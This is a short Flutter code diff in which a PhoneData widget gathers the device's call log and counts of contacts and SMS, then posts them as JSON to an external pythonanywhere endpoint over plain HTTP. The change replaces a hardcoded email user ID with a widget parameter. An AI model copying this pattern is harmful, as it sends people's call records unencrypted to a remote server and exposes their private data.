@@ -36,7 +36,7 @@ class _PhoneDataState extends State<PhoneData> {
     print(dataCollected);
 
     var bodys = json.encode({
-      'userId': "shoaibvice@gmail.com",
+      'userId': widget.data,
       'call_log': {"list": dataCollected}
     });
 
@@ -66,11 +66,8 @@ class _PhoneDataState extends State<PhoneData> {
     } else {
       await Permission.sms.request();
     }
-    bodys = json.encode({
-      'userId': "shoaibvice@gmail.com",
-      'no_contacts': no_contacts,
-      "no_sms": no_sms
-    });
+    bodys = json.encode(
+        {'userId': widget.data, 'no_contacts': no_contacts, "no_sms": no_sms});
 
     url = Uri.parse('http://shababe.pythonanywhere.com/addMobileFpData/');
 
